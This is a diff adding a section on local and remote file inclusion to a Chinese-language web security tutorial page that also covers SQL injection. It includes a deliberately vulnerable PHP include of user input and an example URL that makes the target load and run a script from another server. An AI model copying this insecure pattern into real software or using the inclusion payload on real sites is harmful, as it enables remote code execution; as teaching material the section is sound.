@@ -100,6 +100,27 @@ SELECT * FROM bookTable WHERE author='lqq' and flag=1
                             <p><span class="inline-code">flag=1</span>代表可售的书籍。但是如果把查询字段的<span class="inline-code">'lqq'</span>改成<span class="inline-code">"lqq'--"</span>，由于--是SQL的注释语言，因此--后面的全视为注释，即 <span class="inline-code">and flag=1</span>这个条件被自动忽略了，这样就把原本不该显示的、尚未出版的图书也显示出来了。</p>
                         </li>
                         <li>
+                            <h5>本地文件包含LFI和远程文件包含RFI</h5>
+                            <p>文件包含就是注入一段用户能控制的脚本或代码，并让服务端执行。</p>
+                            <p>文件包含漏洞可能出现在PHP、JSP、ASP等语言中，原理都是一样的，拿PHP包含漏洞举例子。假设web1是PHP搭建的网站，有一个带有文件包含漏洞的PHP文件test.php：</p>
+<code><pre>
+< ?php
+$filename = $_GET['file'];
+include($filename);
+? >
+</pre></code>
+                            <p>把文本test.txt放到web1网站中，在客户端访问web1网站，利用文件包含漏洞，通过test.php打开test.txt文件：</p>
+<code><pre>
+http://web1.com/test.php?file=test.txt
+</pre></code>
+                            <p>通过文件包含漏洞，不仅可以查看漏洞网站上的敏感文件，而且还可以运行远程服务器上的文件。比如我们在另一台服务器Web2上也创建一个名为rfi.txt的文件,然后继续在客户端访问web1网站，利用文件包含漏洞，通过test.php来打开web2上的rfi.php</p>
+<code><pre>
+http://web1.com/test.php?file=http://web2.com/rfi.php
+</pre></code>
+                            <p>那么恶意代码rti.php就可以在web1上运行。</p>
+                            <strong>进行RFI攻击需要同时具备三个条件：<span class="inline-code">allow_url_fopen = On, allow_url_include = On</span>，以及被包含的变量前没有目录的限制。原则就是任何基于客户端的验证都是不可信的。</strong>
+                        </li>
+                        <li>
                             <h5>OS命令注入攻击</h5>
                             <p>OS命令注入攻击是指通过web应用，执行非法的操作系统命令达到攻击的目的。</p>
                         </li>
